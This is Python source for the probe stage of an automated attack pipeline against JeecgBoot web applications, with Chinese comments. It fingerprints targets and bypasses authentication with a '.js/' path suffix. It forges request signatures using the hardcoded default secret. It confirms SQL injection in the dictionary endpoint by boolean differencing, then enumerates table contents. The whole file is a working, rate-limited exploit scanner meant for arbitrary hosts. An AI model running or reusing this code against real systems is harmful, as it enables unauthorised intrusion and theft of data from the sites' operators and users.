"""JeecgBoot 字典注入自动流水线 —— 探测层（全部只读 GET）。"""
import hashlib
import json
import re
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
# JeecgBoot 官方默认 JWT secret（公开值，见其源码 JwtUtil），不是谁的私钥。
# 站点没改过这个值，就能用默认签名过 X-Access-Token 的校验。
DEFAULT_SECRET = "dd05f1c54d63749eda95f9fa6d49v442a"

TENANT_MSG = "租户"
SIGN_FAIL = "签名"


class Probe:
    """一个目标的探测器：限速、请求预算、失败退避都封在这一层。"""

    def __init__(self, host, timeout=12, delay=0.15, max_requests=80, log=None):
        self.host = host.rstrip("/")
        if not self.host.startswith("http"):
            self.host = "https://" + self.host
        self.base = self.host
        self.timeout = timeout
        self.delay = delay
        self.max_requests = max_requests
        self.used = 0
        self.errors = 0
        self.log = log or (lambda *a, **k: None)
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": UA, "Accept": "application/json, text/plain, */*",
                               "Accept-Language": "zh-CN,zh;q=0.9"})
        self.s.verify = False
        self.trace = []
        self.signed = False

    # ---------- 底层 ----------
    def get(self, path, extra_headers=None, note=""):
        if self.used >= self.max_requests:
            return None
        self.used += 1
        url = path if path.startswith("http") else self.base + path
        h = dict(extra_headers or {})
        if self.signed and not path.startswith("http"):
            h.update(self._sign_headers(path))
        t0 = time.time()
        try:
            r = self.s.get(url, headers=h, timeout=self.timeout, allow_redirects=False)
            body = r.content
        except Exception as e:
            self.errors += 1
            self.trace.append({"url": url, "note": note, "err": type(e).__name__})
            if self.errors >= 4:
                self.log(f"  ! {self.host} 连续失败 {self.errors} 次，放弃该目标")
                self.max_requests = 0
            time.sleep(self.delay)
            return None
        self.errors = 0
        rec = {"url": url, "note": note, "code": r.status_code, "size": len(body),
               "ms": int((time.time() - t0) * 1000),
               "head": body[:160].decode("utf-8", "replace")}
        self.trace.append(rec)
        time.sleep(self.delay)
        return r

    # ---------- 1. 指纹 ----------
    def fingerprint(self):
        out = {"ok": False, "prefix": None, "evidence": {}}
        r = self.get("/_app.config.js", note="fp:app.config")
        if r is not None and r.status_code == 200:
            txt = r.text
            out["evidence"]["app.config"] = txt[:400]
            m = re.search(r'VITE_GLOB_API_URL"\s*:\s*"([^"]+)"', txt)
            if m:
                out.update(ok=True, prefix=m.group(1).rstrip("/"), evidence_kind="VITE_GLOB_API_URL")
                t = re.search(r'VITE_GLOB_APP_TITLE"\s*:\s*"([^"]+)"', txt)
                if t:
                    out["title"] = t.group(1)
                return out
        r = self.get("/", note="fp:index")
        if r is not None and r.status_code == 200:
            txt = r.text
            m = re.search(r"""_CONFIG\s*\[\s*['"]domianURL['"]\s*\]\s*=\s*['"]([^'"]+)""", txt)
            if m:
                out.update(ok=True, prefix=m.group(1).rstrip("/"), evidence_kind="_CONFIG.domianURL")
                out["evidence"]["index"] = m.group(0)
                t = re.search(r"<title>([^<]+)</title>", txt)
                if t:
                    out["title"] = t.group(1).strip()
                return out
            if "jeecg" in txt.lower() or "/sys/login" in txt:
                out["evidence"]["index"] = "含 jeecg 标记但未取到前缀"
        # 最后一条：直接把 /api 当默认前缀试一次
        # 仅凭“/api 回了 200/401/403”不算 JeecgBoot：SPA 软 404 与 WAF 也会这样。
        # 必须看到 Jeecg 的 JSON 形态（success/code 字段，或令牌失效文案）才认。
        r = self.get("/api/sys/dict/getDictItems/x,y,z", note="fp:probe-api")
        if r is not None and r.status_code in (200, 401, 403):
            txt = (r.text or "").strip()
            # Jeecg 的字典接口一定带 success 字段；只有 code/message 的 JSON（网关错误页）不算
            looks_json = txt.startswith("{") and '"success"' in txt
            jeecg_msg = ("Token" in txt) or ("令牌" in txt) or ("签名" in txt)
            if looks_json or (r.status_code == 401 and jeecg_msg):
                out.update(ok=True, prefix="/api", evidence_kind="guess:/api")
            else:
                out["evidence"]["probe_api"] = f"非 Jeecg 形态（{r.status_code}, {txt[:40]!r}）"
        return out

    # ---------- 2. 认证绕过 ----------
    def bypass(self, prefix):
        base = f"{prefix}/sys/dict/getDictItems/x,y,z"
        out = {"raw": None, "js": None, "jsslash": None}
        for key, path in (("raw", base), ("js", base + ".js"), ("jsslash", base + ".js/")):
            r = self.get(path, note=f"bypass:{key}")
            if r is not None:
                out[key] = {"code": r.status_code, "size": len(r.content),
                            "head": r.text[:120].replace("\n", " ")}
        j = out.get("jsslash") or {}
        out["open"] = bool(j.get("code") == 200)
        out["waf"] = any(v.get("code") == 403 for v in out.values() if isinstance(v, dict))
        return out

    # ---------- 3. 签名（默认密钥） ----------
    @staticmethod
    def _sign(path):
        seg = path.split("?")[0]
        seg = seg[seg.rfind("/") + 1:]
        o = {}
        if "," in seg:
            o["x-path-variable"] = urllib.parse.unquote(seg)
        payload = json.dumps(o, ensure_ascii=False, separators=(",", ":")) + DEFAULT_SECRET
        return hashlib.md5(payload.encode()).hexdigest().upper()

    def _sign_headers(self, path):
        return {"X-Sign": self._sign(path), "X-TIMESTAMP": str(int(time.time() * 1000)),
                "X-Version": "v3"}

    def sign_probe(self, path):
        r = self.get(path, extra_headers=self._sign_headers(path), note="sign:default-secret")
        if r is None:
            return {"ok": False, "code": None}
        return {"ok": r.status_code == 200, "code": r.status_code, "size": len(r.content),
                "head": r.text[:120]}

    # ---------- 4. 多租户 ----------
    def tenant(self, prefix):
        r = self.get(f"{prefix}/sys/tenant/list", note="tenant")
        if r is None:
            return {"state": "unknown"}
        if r.status_code == 200:
            try:
                j = r.json()
            except Exception:
                j = {}
            data = j.get("result") or j.get("data") or []
            if isinstance(data, list) and data:
                return {"state": "on", "n": len(data)}
            return {"state": "empty200"}
        return {"state": f"http{r.status_code}"}

    # ---------- 5. 布尔差分 ----------
    def diff(self, prefix, true_q, false_q, ctl_true=None, ctl_false=None):
        def one(dictcode, note):
            p = f"{prefix}/sys/dict/getDictItems/{dictcode}-- .js/"
            r = self.get(urllib.parse.quote(p, safe="/,=()").replace(" ", "%20"), note=note)
            if r is None:
                return {"code": None}
            rows = None
            try:
                j = r.json()
                res = j.get("result")
                rows = len(res) if isinstance(res, list) else None
                msg = j.get("message")
            except Exception:
                msg = r.text[:80]
            return {"code": r.status_code, "size": len(r.content), "rows": rows, "msg": msg}

        out = {"true": one(true_q, "diff:true"), "false": one(false_q, "diff:false")}
        if ctl_true:
            out["ctl"] = one(ctl_true, "diff:ctl")
        ctl = out.get("ctl") or {}
        out["injected"] = bool(
            isinstance(out["true"].get("rows"), int) and out["true"]["rows"] > 0
            and out["false"].get("rows") == 0
            and ctl.get("rows") is None
            and ctl.get("code") == 200
            and isinstance(ctl.get("size"), int) and 60 <= ctl["size"] <= 140)
        return out

    # ---------- 6. 数据测绘 ----------
    def dict_rows(self, prefix, table, text, code, flt):
        p = (f"{prefix}/sys/dict/getDictItems/{table},{text},{code},{flt}"
             "-- .js/")
        r = self.get(urllib.parse.quote(p, safe="/,=()").replace(" ", "%20"), note=f"enum:{table}.{text}")
        if r is None:
            return None
        try:
            j = r.json()
        except Exception:
            return {"code": r.status_code, "bytes": len(r.content), "msg": r.text[:60], "rows": None}
        res = j.get("result")
        if not isinstance(res, list):
            return {"code": r.status_code, "bytes": len(r.content), "msg": j.get("message"), "rows": None}
        vals = [x.get("text") for x in res]
        nonempty = [v for v in vals if str(v or "").strip()]
        items = [{"value": x.get("value"), "text": x.get("text")} for x in res]
        return {"code": r.status_code, "bytes": len(r.content), "rows": len(res),
                "nonempty": len(nonempty), "values": vals, "items": items}
